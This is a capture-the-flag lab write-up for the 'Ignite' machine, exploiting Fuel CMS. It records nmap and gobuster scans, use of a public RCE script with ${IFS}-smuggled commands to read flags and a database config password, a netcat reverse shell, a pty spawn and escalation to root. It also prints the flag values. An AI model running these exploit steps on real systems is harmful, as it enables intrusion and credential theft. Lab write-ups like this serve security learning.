# Ignite


1. Enumerate with nmap
>sudo nmap -sS --script=vuln -A 10.10.90.226        
>[sudo] password for kali: 
>Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-12 15:24 EST
>Pre-scan script results:
>| broadcast-avahi-dos: 
>|   Discovered hosts:
>|     224.0.0.251
>|   After NULL UDP avahi packet DoS (CVE-2011-1002).
>|_  Hosts are all up (not vulnerable).
>Nmap scan report for 10.10.90.226
>Host is up (0.19s latency).
>Not shown: 999 closed tcp ports (reset)
>PORT   STATE SERVICE VERSION
>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
>|_http-dombased-xss: Couldn't find any DOM based XSS.
>|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
>| vulners: 
>|   cpe:/a:apache:http_server:2.4.18: 
>|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
>|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
>|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
>|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668
>|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
>|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
>|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/ 7.2     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/  *EXPLOIT*
>|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/      7.2     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/       *EXPLOIT*
>|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2     https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    *EXPLOIT*
>|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
>|       1337DAY-ID-32502        7.2     https://vulners.com/zdt/1337DAY-ID-32502        *EXPLOIT*
>|       MSF:ILITIES/UBUNTU-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/        *EXPLOIT*
>|       MSF:ILITIES/UBUNTU-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/       *EXPLOIT*
>|       MSF:ILITIES/SUSE-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/ *EXPLOIT*
>|       MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/ *EXPLOIT*
>|       MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/ *EXPLOIT*
>|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/       *EXPLOIT*
>|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/     6.8     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/      *EXPLOIT*
>|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/        *EXPLOIT*
>|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/       *EXPLOIT*
>|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/        *EXPLOIT*
>|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/       *EXPLOIT*
>|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/        *EXPLOIT*
>|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/       *EXPLOIT*
>|       MSF:ILITIES/FREEBSD-CVE-2017-15715/     6.8     https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/      *EXPLOIT*
>|       MSF:ILITIES/DEBIAN-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/       *EXPLOIT*
>|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/ *EXPLOIT*
>|       MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/ *EXPLOIT*
>|       MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/ *EXPLOIT*
>|       MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/ 6.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/  *EXPLOIT*
>|       MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/ *EXPLOIT*
>|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
>|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438
>|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452
>|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
>|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
>|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
>|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
>|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
>|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/ 6.0     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/  *EXPLOIT*
>|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/      6.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/       *EXPLOIT*
>|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
>|       EDB-ID:47689    5.8     https://vulners.com/exploitdb/EDB-ID:47689      *EXPLOIT*
>|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
>|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
>|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT*
>|       CVE-2016-5387   5.1     https://vulners.com/cve/CVE-2016-5387
>|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT*
>|       MSF:ILITIES/UBUNTU-CVE-2018-1333/       5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/        *EXPLOIT*
>|       MSF:ILITIES/UBUNTU-CVE-2018-1303/       5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/        *EXPLOIT*
>|       MSF:ILITIES/UBUNTU-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/       *EXPLOIT*
>|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/       5.0     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/        *EXPLOIT*
>|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/       *EXPLOIT*
>|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/     5.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/      *EXPLOIT*
>|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/      5.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/       *EXPLOIT*
>|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/       *EXPLOIT*
>|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/       *EXPLOIT*
>|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/        5.0     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/ *EXPLOIT*
>|       MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED  5.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED   *EXPLOIT*
>|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    *EXPLOIT*
>|       EXPLOITPACK:2666FB0676B4B582D689921651A30355    5.0     https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355    *EXPLOIT*
>|       EDB-ID:40909    5.0     https://vulners.com/exploitdb/EDB-ID:40909      *EXPLOIT*
>|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798
>|       CVE-2021-33193  5.0     https://vulners.com/cve/CVE-2021-33193
>|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690
>|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
>|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567
>|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
>|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
>|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
>|       CVE-2018-17189  5.0     https://vulners.com/cve/CVE-2018-17189
>|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
>|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303
>|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
>|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
>|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
>|       CVE-2016-8740   5.0     https://vulners.com/cve/CVE-2016-8740
>|       CVE-2016-4979   5.0     https://vulners.com/cve/CVE-2016-4979
>|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT*
>|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/       4.9     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/        *EXPLOIT*
>|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
>|       MSF:ILITIES/UBUNTU-CVE-2018-1302/       4.3     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/        *EXPLOIT*
>|       MSF:ILITIES/UBUNTU-CVE-2018-1301/       4.3     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/        *EXPLOIT*
>|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/       4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/        *EXPLOIT*
>|       MSF:ILITIES/DEBIAN-CVE-2019-10092/      4.3     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/       *EXPLOIT*
>|       MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/        4.3     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/ *EXPLOIT*
>|       MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/        4.3     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/ *EXPLOIT*
>|       EDB-ID:47688    4.3     https://vulners.com/exploitdb/EDB-ID:47688      *EXPLOIT*
>|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985
>|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
>|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302
>|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301
>|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
>|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
>|       CVE-2016-1546   4.3     https://vulners.com/cve/CVE-2016-1546
>|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
>|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
>|       MSF:ILITIES/UBUNTU-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/        *EXPLOIT*
>|       MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/ 3.5     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/  *EXPLOIT*
>|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/        *EXPLOIT*
>|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/      3.5     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/       *EXPLOIT*
>|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/        *EXPLOIT*
>|       MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/ 3.5     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/  *EXPLOIT*
>|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
>|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
>|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
>|       EDB-ID:46676    0.0     https://vulners.com/exploitdb/EDB-ID:46676      *EXPLOIT*
>|       EDB-ID:42745    0.0     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT*
>|       1337DAY-ID-663  0.0     https://vulners.com/zdt/1337DAY-ID-663  *EXPLOIT*
>|       1337DAY-ID-601  0.0     https://vulners.com/zdt/1337DAY-ID-601  *EXPLOIT*
>|       1337DAY-ID-4533 0.0     https://vulners.com/zdt/1337DAY-ID-4533 *EXPLOIT*
>|       1337DAY-ID-3109 0.0     https://vulners.com/zdt/1337DAY-ID-3109 *EXPLOIT*
>|_      1337DAY-ID-2237 0.0     https://vulners.com/zdt/1337DAY-ID-2237 *EXPLOIT*
>|_http-server-header: Apache/2.4.18 (Ubuntu)
>| http-enum: 
>|   /robots.txt: Robots file
>|   /0/: Potentially interesting folder
>|   /home/: Potentially interesting folder
>|_  /index/: Potentially interesting folder
>|_http-csrf: Couldn't find any CSRF vulnerabilities.
>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
>TCP/IP fingerprint:
>OS:SCAN(V=7.92%E=4%D=12/12%OT=80%CT=1%CU=39109%PV=Y%DS=4%DC=T%G=Y%TM=61B65C
>OS:5A%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=4%ISR=10D%TI=Z%CI=I%TS=A)SEQ(SP=
>OS:107%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=A)SEQ(SP=108%GCD=1%ISR=10D%TI=Z%TS=A
>OS:)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%II=I%TS=A)OPS(O1=M506ST11NW7%O2=M506ST11N
>OS:W7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=68DF
>OS:%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506
>OS:NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R
>OS:=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=
>OS:AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=
>OS:40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID
>OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
>
>Network Distance: 4 hops
>
>TRACEROUTE (using port 8888/tcp)
>HOP RTT       ADDRESS
>1   55.43 ms  10.13.0.1
>2   ... 3
>4   193.50 ms 10.10.90.226
>
>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
>Nmap done: 1 IP address (1 host up) scanned in 460.11 seconds

2. We know a web application is being run, so we visit the page on our web browser. Nothing seems off, so we enumerate with gobuster: `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.90.226`
>$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.90.226
>===============================================================
>Gobuster v3.1.0
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
>===============================================================
>[+] Url:                     http://10.10.90.226
>[+] Method:                  GET
>[+] Threads:                 10
>[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
>[+] Negative Status codes:   404
>[+] User Agent:              gobuster/3.1.0
>[+] Timeout:                 10s
>===============================================================
>2021/12/12 15:36:37 Starting gobuster in directory enumeration mode
>===============================================================
>/.hta                 (Status: 403) [Size: 291]
>/.htaccess            (Status: 403) [Size: 296]
>/.htpasswd            (Status: 403) [Size: 296]
>/@                    (Status: 400) [Size: 1134]
>/0                    (Status: 200) [Size: 16595]
>/assets               (Status: 301) [Size: 313] [--> http://10.10.90.226/assets/]
>/home                 (Status: 200) [Size: 16595]                                
>/index                (Status: 200) [Size: 16595]                                
>/index.php            (Status: 200) [Size: 16595]                                
>/lost+found           (Status: 400) [Size: 1134]                                 
>/offline              (Status: 200) [Size: 70]                                   
>/robots.txt           (Status: 200) [Size: 30]                                   
>/server-status        (Status: 403) [Size: 300]                                  
>                                                                                 
>===============================================================
>2021/12/12 15:40:05 Finished
>===============================================================

- I stopped the machine here and started again at another time, so the ip addresses will be different but the process is still the same

3. In robots.txt we find /fuel, so we check it out and find that there's an admin page. We check the docs in the documentation (which is the landing page) and find the default credentials are admin.
4. I wasted a lot of time trying to get past the file uploading so I could upload a reverse shell so I took a peak at some writeups and saw that they literally just searched for the vuln. I did so too and found [this](https://github.com/noraj/fuelcms-rce) great program on github that literally executes commands for you. For some reason, however, I was getting errors when trying to pass arguments - which I believe was due to spaces. For example, if I did `ruby exploit.rb http://127.0.0.1:8099/index.php/ 'ls'` (the ip address is not relevant) it worked perfectly, but if I used `ls -al` instead it was giving me errors. I got past this by using [IFS](https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces), which has a default value of a space. So all I did was `ruby exploit.rb http://127.0.0.1:8099/index.php/ 'ls${IFS}-al'` and it worked perfectly
5. For here I found that the flax.txt in the user directory was in `/home/www-data/flag.txt`, so I did `ruby exploit.rb http://10.10.76.238/index.php 'cat${IFS}/home/www-data/flag.txt'` and got `6470e394cbf6dab6a91682cc8585059b`
6. I tried finding the last flag by using sudo but I wasn't getting any output. I finally succumbed and took a look at the writeup and saw that the password was located at `fuel/application/config/database.php`. I used `ruby exploit.rb http://10.10.76.238/index.php 'cat${IFS}fuel/application/config/database.php${IFS}|${IFS}grep${IFS}password'` and got
>['password'] The password used to connect to the database
>'password' => 'mememe',
    - I just realized that the fuelcms docs actually tell us that the password should be stored in the database.php file. Probably should have read it
7. For the privilege escalation I realized that there's a much better [program](https://github.com/AssassinUKG/fuleCMS) that much more user friendly and lets you reverse shell immediately. This made my life so much easier. Now I start up the program, set up a netcat listener at a port that's not being used `nc -nvlp 4444`, use `shell_me` on the program's prompt, and get a shell instantly. However, since we don't have tty yet we won't be able to use sudo.
8. To get the tty we simply use python `python -c 'import pty; pty.spawn("/bin/sh")'`, and now we should be able to use sudo.
9. Elevate to root with `su root`, enter the password we found earlier, and then `ls /root` and `cat /root/root.txt` to find `b9bbcb33e11b80be759c4e844862482d`
